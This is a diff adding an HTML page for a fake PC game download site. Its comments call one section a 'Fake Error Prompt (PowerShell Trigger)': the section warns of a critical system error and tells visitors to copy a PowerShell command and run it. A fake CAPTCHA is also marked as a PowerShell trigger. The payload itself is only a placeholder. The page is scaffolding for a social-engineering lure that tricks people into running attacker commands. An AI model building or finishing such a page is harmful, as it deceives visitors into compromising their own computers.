@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Game Download Central</title>
+
+    <!-- Corrected path for CSS -->
+    <link rel="stylesheet" href="css/styles.css">
+    
+    <!-- Corrected path for JavaScript -->
+    <script src="js/main.js" defer></script>
+</head>
+<body>
+    <!-- Header Section -->
+    <header>
+        <h1>Welcome to Game Download Central</h1>
+        <p>Your ultimate hub for downloading the latest and greatest PC games!</p>
+    </header>
+
+    <!-- Games Section -->
+    <section id="games">
+        <h2>Featured Games</h2>
+        <div class="game-card">
+            <h3>Game 1: Shooter Pro</h3>
+            <button class="download-btn" onclick="triggerDownload1()">Download Now</button>
+        </div>
+        <div class="game-card">
+            <h3>Game 2: Racing Blast</h3>
+            <button class="download-btn" onclick="triggerDownload2()">Download Now</button>
+        </div>
+        <div class="game-card">
+            <h3>Game 3: Mystery Quest</h3>
+            <button class="download-btn" onclick="triggerDownload3()">Download Now</button>
+        </div>
+    </section>
+
+    <!-- Fake Error Prompt (PowerShell Trigger) -->
+    <div id="error-prompt" class="hidden">
+        <h3>System Error Detected!</h3>
+        <p>Your system has detected a critical issue. To resolve it, please copy the following command and run it in PowerShell:</p>
+        <pre id="error-command">powershell -Command ...</pre> <!-- Placeholder for PowerShell payload -->
+        <button onclick="copyCommand()">Copy Command</button>
+    </div>
+
+    <!-- CAPTCHA (Trigger PowerShell) -->
+    <section id="captcha-section" class="hidden">
+        <h3>Prove you're human!</h3>
+        <p>To continue the download, solve this CAPTCHA:</p>
+        <input type="text" placeholder="Type the text shown in the image">
+        <button onclick="triggerCaptcha()">Submit</button>
+    </section>
+
+    <!-- Footer Section -->
+    <footer>
+        <p>&copy; 2024 Game Download Central. All Rights Reserved.</p>
+    </footer>
+</body>
+</html>
